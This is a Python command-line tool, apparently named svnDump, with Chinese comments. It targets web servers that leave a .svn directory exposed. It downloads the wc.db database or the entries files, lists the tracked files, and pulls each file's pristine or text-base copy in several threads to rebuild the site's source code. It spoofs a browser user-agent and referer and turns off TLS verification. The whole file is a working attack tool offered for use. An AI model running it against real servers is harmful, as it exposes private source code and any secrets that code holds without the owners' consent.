# -*- coding=utf-8 -*-

import requests,threading
import sqlite3,os,re,sys,optparse
from prettytable import PrettyTable
import queue
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

timeout = 5
header={
  'accept':'text/html,application/xhtml+xml,application/xml',
  'user-agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Mobile Safari/537.36',
  'referer':'http://baidu.com'
}
table_dump = ''
download_queue = queue.Queue()

# 下载 wc.db
def download_db(url):
  db_url = url + "wc.db"
  # 判断存放数据库的目录是否存在
  if(not os.path.exists('dbs')):
    os.makedirs('dbs')
  #匹配url中的host，然后作为文件夹名
  pattern = re.compile(r'(?:\w+\.+)+(?:\w+)')
  host = pattern.findall(url)
  # 判断host 这个目录是否存在，如果存在的话就创建 host(i) i 递增
  if(not os.path.exists("dbs/"+host[0])):
    os.makedirs("dbs/"+host[0])
    path = "dbs/"+host[0]
  else:
    i = 1
    while (os.path.exists("dbs/"+host[0]+"("+str(i)+")")):
      i = i + 1
    os.makedirs("dbs/"+host[0]+"("+str(i)+")")
    path = "dbs/"+host[0]+"("+str(i)+")"

  # 组成最终地址
  db_path = path + "/wc.db"
  # 下载数据库
  res = None
  try:
    res = requests.get(db_url, headers=header, timeout=timeout, verify=False)
  except:
    pass
  if not res or res.status_code!=200:
    print("[-] 未找到%s/wc.db"%url)
    sys.exit()
  with open(db_path,"wb") as file:
    file.write(res.content)
  return db_path

# 连接数据库，查询数据库 然后把 local_relpath \ kind \ checksum 取出来
def db_conn(db_path):
  try:
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("select local_relpath,kind,checksum from NODES")
    values = cursor.fetchall()
    return values
  except:
    print("[-] wc.db连接失败!")

def print_values(values):
  #print("[+] 文件名 | 文件类型 | checksum")
  table = PrettyTable(["FileName","FileType","CheckSum"])
  for v in values:
    if v[0] :
      #print("[+] %s   %s   %s" %(v[0],v[1],v[2]))
      table.add_row([v[0],v[1],v[2]])
  table.sort_key("CheckSum")
  table.reversesort = True
  print(table)

# 用queue存放values中的记录，供下载源码使用
def gen_queue(values):
  global download_queue
  for v in values:
    if v[0]:
      download_queue.put(v)

def down_file(url,db_path):
  # 获取下载后保存的本地地址
  path = os.path.dirname(db_path) # dbs/127.0.0.1

  while not download_queue.empty(): # 如果queue不为空
    value = download_queue.get()
    if value[1]=="dir":
      if not os.path.exists(path +"/"+ value[0]):
        try:
          os.makedirs(path +"/"+ value[0])
        except:
          pass
    else:
      # 如果checksum == None 说明文件已经被删除
      if value[2] == None:
        continue
      # 处理checksum
      checksum = value[2][6:]
      url_file = url+"pristine/"+checksum[:2]+"/"+checksum+".svn-base"
      file_uri = ".svn/pristine/"+checksum[:2]+"/"+checksum+".svn-base"
      #print(url_file)
      # 下载代码
      global table_dump
      try:
        res = requests.get(url_file, headers=header, timeout=timeout, verify=False)
      except:
        #print("[-] 下载%s失败!" %url_file)
        table_dump.add_row([value[0],file_uri, 'Failed'])
        continue
      dirPath = os.path.dirname(path+"/"+value[0])
      if not os.path.exists(dirPath):
        try:
          os.makedirs(dirPath)
        except:
          pass
      with open(f'{path}/{value[0]}', "wb") as file :
        file.write(res.content)
        #global table_dump
        table_dump.add_row([value[0], file_uri, 'OK'])
    download_queue.task_done() # 通知队列已消费完该任务

def svnVersionMoreThan17(url):
  # if SVN version > 1.7 return True, else return false
  url = url + 'entries'
  try:
    res = requests.get(url, headers=header, timeout=timeout, verify=False)
    isMoreThan17 = res.text.startswith('12\n')
    print(f'SVN version' + ('>' if isMoreThan17 else '<' + '1.7'), flush=True)
    return isMoreThan17
  except:
    print(f'Get svn version Error!\n', flush=True)
    sys.exit()

def svnMoreThan17(url):
  db_path = download_db(url)
  values = db_conn(db_path)
  global table_dump
  global download_queue
  table_dump = PrettyTable(['FileName','URL','Download State'])
  print_values(values)
  gen_queue(values)
  threads = []
  for i in range(options.thread_num):
    thread = threading.Thread(target=down_file, args=(url, db_path,))
    thread.start()
    threads.append(thread)
  for thread in threads:
    thread.join()

  print("[+] 已经Dump完成!")

class SvnLessThan1_7:
  def __init__(self, url):
    self.url = url
    self.file_list = []
    self.dir_list = []
    self.flag = False

  # 解析 entries
  def entries(self, url, dir):
    print(f'Analyze: {url}', flush=True)
    try:
      res = requests.get(url, headers=header, timeout=timeout, verify=False)
      list = res.text.split('\n')
      i = 0
      for data in list:
        if data == "file":
          if list[i-1]:
            if dir:
              self.file_list.append(dir + '/' + list[i-1])
            else:
              self.file_list.append(list[i - 1])
        elif data == "dir":
          if list[i-1]:
            if dir:
              self.dir_list.append(dir + '/' + list[i-1])
            else:
              self.dir_list.append(list[i-1])
            self.flag = True
        i = i+1
    except:
      pass
  
  # 循环解析 entries
  def forloop(self):
    for dir in self.dir_list:
      url = f'{os.path.dirname(os.path.dirname(self.url))}/{dir}/.svn/entries'
      self.entries(url, dir)

  # print file
  def print_file(self):
    self.entries(self.url + 'entries', '')
    if self.flag: self.forloop()
    table = PrettyTable(['File Name', 'File Type', 'URL'])
    for name in self.file_list:
      table.add_row([
        name,
        'file',
        f'{os.path.dirname(name)}/.svn/text-base/{os.path.basename(name)}.svn-base'
      ])
    table.sort_key("URL")
    table.reversesort = True
    print(table)

  def dumpFile(self):
    if (not os.path.exists('dbs')): os.makedirs('dbs')
    # 匹配 url 中的 host，然后作为文件夹名
    pattern = re.compile(r'(?:\w+\.+)+(?:\w+)')
    host = pattern.findall(self.url)
    # 判断 host 这个目录是否存在，如果存在的话就创建 host(i) i 递增
    if (not os.path.exists(f'dbs/{host[0]}')):
      path = f'dbs/{host[0]}'
      os.makedirs(path)
    else:
      i = 1
      while os.path.exists(f'dbs/{host[0]}({i})'):
        i = i + 1
      path = f'dbs/{host[0]}({i})'
      os.makedirs(path)
    self.entries(f'{self.url}entries', '')
    self.forloop()

    for dir in self.dir_list:
      if not os.path.exists(f'{path}/{dir}'): os.makedirs(f'{path}/{dir}')

    table = PrettyTable(['FileName', 'URL', 'Download State'])
    for file in self.file_list:
      if os.path.dirname(file):
        file_url = f'{os.path.dirname(os.path.dirname(self.url))}/{os.path.dirname(file)}/.svn/text-base/{os.path.basename(file)}.svn-base'
      else:
        file_url = f'{os.path.dirname(os.path.dirname(self.url))}{os.path.dirname(file)}/.svn/text-base/{os.path.basename(file)}.svn-base'
      try:
        res = requests.get(file_url, headers=header, timeout=timeout, verify=False)
        with open(f'{path}/{file}', 'wb') as f:
          f.write(res.content)
          table.add_row([
            file, 
            f'{os.path.dirname(file)}/.svn/text-base/{os.path.basename(file)}.svn-base', 
            'OK'
          ])
      except:
        pass
    table.sort_key('URL')
    table.reversesort=True
    print(table)


if __name__ == '__main__':
  """
  命令行参数：
    python3 svnDump.py -u TargetURL [--thread 5]
  """
  print("""\n
  _____            _____                        
 / ____|          |  __ \                       
| (_____   ___ __ | |  | |_   _ _ __ ___  _ __  
 \___ \ \ / / '_ \| |  | | | | | '_ ` _ \| '_ \ 
 ____) \ V /| | | | |__| | |_| | | | | | | |_) |
|_____/ \_/ |_| |_|_____/ \__,_|_| |_| |_| .__/ 
                                         | |    
                                         |_|    
\n""", flush=True)
  
  opt = optparse.OptionParser()
  opt.add_option("-u", "--url", action="store", dest="url", help="TargetURL e.g.http://url/.svn")
  opt.add_option("--thread", action="store", dest="thread_num", type="int", default=5, help="The thread num default is 5")
  (options, args) = opt.parse_args()
  if not options.url or not isinstance(options.url, str):
    print("[-] URL Error!", flush=True)
    sys.exit()
  url = options.url
  # 判断 url 后面是否有 / 如果没有就加上
  re_ = re.compile(r'[\w\.\/\:]+/$')
  if not re_.search(url):
    url = url + "/"

  if svnVersionMoreThan17(url):
    svnMoreThan17(url)
  else:
    svn = SvnLessThan1_7(url)
    svn.dumpFile()
